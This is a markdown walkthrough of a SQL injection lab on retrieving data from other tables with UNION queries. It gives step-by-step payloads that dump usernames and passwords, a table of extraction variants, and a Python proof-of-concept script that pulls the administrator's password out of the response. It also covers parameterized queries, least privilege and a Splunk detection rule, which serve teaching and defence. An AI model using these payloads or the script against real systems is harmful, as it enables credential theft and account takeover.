# Lab Walkthrough: SQL Injection UNION Attack, Retrieving Data from Other Tables

* **Vulnerability Type:** In-Band SQL Injection (UNION-Based)
* **Target Context:** Data Exfiltration & Account Takeover
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Not Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [Exfiltration Vectors & Constraints Comparison](https://www.google.com/search?q=%25234-exfiltration-vectors--constraints-comparison&utm_source=gemini)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-python-poc&utm_source=gemini)
6. [Defense & Prevention](https://www.google.com/search?q=%25236-defense--prevention&utm_source=gemini)
7. [Detection & SIEM Monitoring Rules](https://www.google.com/search?q=%25237-detection--siem-monitoring-rules&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

A `UNION` SQL injection attack exploits endpoints that reflect database query results directly into the HTTP response. By appending a `UNION SELECT` statement, an attacker forces the database to evaluate a secondary query and append its results to the original dataset.

* **The Core Flaw:** The application takes user input from the URL (`category` parameter) and concatenates it directly into a `SELECT` statement. Because the application blindly renders all rows returned by the database engine, it will render records from entirely different tables if the attacker structures the query correctly.
* **Real-World Analogy:** Imagine requesting a public directory of department store locations (Query 1) from an automated filing clerk. You slip a note onto the request saying, *"Also, append the master list of all employee vault codes"* (Query 2). The clerk executes both, staples the pages together (UNION), and hands you the combined document.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   UNION DATA EXFILTRATION FLOW                         │
└────────────────────────────────────────────────────────────────────────┘

  [Original Query] SELECT name, description FROM products WHERE cat='Gifts'
                                      +
  [Attacker Query] UNION SELECT username, password FROM users--
                                      │
  [Database Eval]  Col 1: name (Text)  <-- maps to --> username (Text)
                   Col 2: desc (Text)  <-- maps to --> password (Text)
                                      │
  [Execution]      Query succeeds. Usernames and passwords render inside 
                   the product grid on the frontend DOM.

```

> **Learning Checkpoint 1:** Why is mapping the column count and data types a strict prerequisite? The `UNION` operator mathematically requires both datasets to have the exact same matrix dimensions (columns) and compatible data types. If you attempt to pull two columns (`username, password`) into a query that only selects one column (`name`), the database engine rejects the entire query.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The product category filter (`/filter?category=`).
* **Primary Objective:** Extract all usernames and passwords from the `users` table and log in to the application as the `administrator`.
* **Validation Signal:** The lab is marked solved upon successful authentication into the administrator panel.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Determine Column Count

Establish the structural width of the original query using incremental `NULL` values.

* **Payload:** `category=Gifts'+UNION+SELECT+NULL,NULL--`
* *Result:* The application returns `200 OK`. The original query selects exactly **two columns**.

### Phase 2: Verify Text-Compatible Columns

Confirm that both columns can hold string data, which is necessary for extracting usernames and passwords.

* **Payload:** `category=Gifts'+UNION+SELECT+'abc','def'--`
* *Result:* The page renders "abc" and "def" within the product list. Both columns support `VARCHAR`/text data.

### Phase 3: Data Exfiltration

Construct the final payload to target the hidden `users` table. Map the `username` to the first column and the `password` to the second column.

* **Payload:** `category=Gifts'+UNION+SELECT+username,+password+FROM+users--`
* *Result:* The database appends the contents of the `users` table to the product list.
* *Action:* Scroll through the rendered HTML page to find the row displaying `administrator` and its corresponding password hash or plaintext value.

### Phase 4: Account Takeover

* Navigate to the `/login` endpoint.
* Enter `administrator` and the extracted password.
* *Result:* Successful login, lab solved.

> **Learning Checkpoint 2:** What if the query only returned one column, but you needed both the username and the password? You would use database-specific string concatenation operators to combine them into a single string (e.g., `username || ':' || password` in PostgreSQL/Oracle or `CONCAT(username, ':', password)` in MySQL).

---

## 4. Exfiltration Vectors & Constraints Comparison

During penetration tests, you will rarely encounter a perfect 1-to-1 column mapping. Understanding how to adapt your exfiltration strategy is critical.

| Scenario | Attacker Requirement | Exploit Strategy (PostgreSQL / SQLite) |
| --- | --- | --- |
| **2 Target fields, 2 Text columns** | Extract `user` and `pass`. | `UNION SELECT username, password FROM users` |
| **2 Target fields, 1 Text column** | Extract `user` and `pass` into a single field. | `UNION SELECT NULL, username || '~' || password FROM users` |
| **Multiple fields, 1 Text column** | Dump entire row as a single string. | `UNION SELECT NULL, CONCAT_WS(':', id, username, email, password) FROM users` |
| **0 Text columns** | Data type coercion fails entirely. | Pivot to Error-Based SQLi or Boolean Blind SQLi. |

---

## 5. Automated Exploitation Script (Python PoC)

This script automates the payload delivery and parses the HTML response to extract the administrator credentials programmatically.

```python
#!/usr/bin/env python3
"""
UNION SQLi Exfiltration Automator (PoC)
Extracts credentials from the target table and parses the DOM.
"""

import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exfiltrate_credentials(target_url):
    session = requests.Session()
    # Assuming Phase 1 & 2 are complete: 2 columns, both text
    base_url = f"{target_url}/filter?category=Gifts"
    
    # Payload targeting the users table
    payload = "'+UNION+SELECT+username,+password+FROM+users--"
    
    print(f"[*] Sending Exfiltration Payload: {payload}")
    response = session.get(base_url + payload, verify=False)
    
    if response.status_code == 200:
        print("[+] Query executed successfully. Parsing DOM for credentials...")
        
        # Regex to find standard table rows or specific DOM structures
        # The lab typically reflects data in <th> and <td> tags
        matches = re.findall(r'(administrator)</td>\s*<td>(.*?)</td>', response.text, re.IGNORECASE)
        
        # Fallback regex if data is rendered in raw text or different tags
        if not matches:
             matches = re.findall(r'(administrator)[^\w]+([a-zA-Z0-9]{10,32})', response.text, re.IGNORECASE)
             
        if matches:
            admin_user = matches[0][0]
            admin_pass = matches[0][1]
            print(f"\n[!] CRITICAL DATA COMPROMISED:")
            print(f"    Username: {admin_user}")
            print(f"    Password: {admin_pass}")
            print("\n[*] Proceed to /login to complete account takeover.")
        else:
            print("[-] Payload executed, but could not parse the administrator credentials from the response.")
    else:
        print(f"[-] Exploit failed. HTTP Status: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <TARGET_BASE_URL>")
        sys.exit(1)
        
    exfiltrate_credentials(sys.argv[1].rstrip('/'))

```

---

## 6. Defense & Prevention

* **Parameterized Queries (Prepared Statements):** The only foolproof defense against SQL injection. Parameterization forces the database parser to treat the user's input strictly as a literal string, completely ignoring structural operators like `UNION` or `'`.
```java
// SECURE Java/JDBC Implementation
String query = "SELECT name, description FROM products WHERE category = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userInputCategory); 

```


* **Object-Relational Mapping (ORM):** Utilizing frameworks like Hibernate, Entity Framework, or Django ORM abstracts raw SQL execution and inherently parameterizes inputs by default.
* **Network Segmentation & Least Privilege:** Ensure the database user account utilized by the web application only has `SELECT` permissions on tables strictly necessary for the application's function (e.g., blocking access to the `users` table from the product catalog service).

---

## 7. Detection & SIEM Monitoring Rules

Detect data exfiltration attempts by monitoring for structural SQL keywords in HTTP query parameters.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| eval decoded_uri=urldecode(uri_query)
| search decoded_uri="*UNION*SELECT*" AND decoded_uri="*FROM*users*"
| stats count by src_ip, decoded_uri, status
| where count > 0

```

*Indicator of Attack (IoA):* Attackers mapping a database schema will typically trigger `UNION SELECT table_name FROM information_schema.tables` before targeting specific tables like `users`.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **`HTTP 500 Internal Server Error`** | Column count or type mismatch. | Re-verify the column count using `NULL`. Ensure you are not injecting string data (`username`) into an integer-only column. |
| **Query succeeds (200 OK), but no data appears** | Application truncates output rows. | The application might only render the *first* row. Break the primary query by using an invalid category (e.g., `category=INVALID_CAT'+UNION...`) to force the application to render your injected row first. |
| **Syntax Error on backend** | Trailing characters breaking the query. | Ensure your comment operator (`--`) properly truncates the rest of the backend query. Try `-- ` (with a trailing space) or `#` for MySQL environments. |

---

## 9. References & Standards

* [PortSwigger: SQL Injection UNION Attacks](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection/union-attacks&utm_source=gemini)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/&utm_source=gemini)
* [MITRE ATT&CK: T1190 - Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/&utm_source=gemini)

---

> **Key Insight:** In-band UNION SQL injection completely subverts data isolation. By leveraging a seemingly innocuous read-only endpoint (like a product filter), an attacker can forcibly map the underlying query structure and extract highly sensitive authentication records from completely unrelated tables in a single HTTP request.
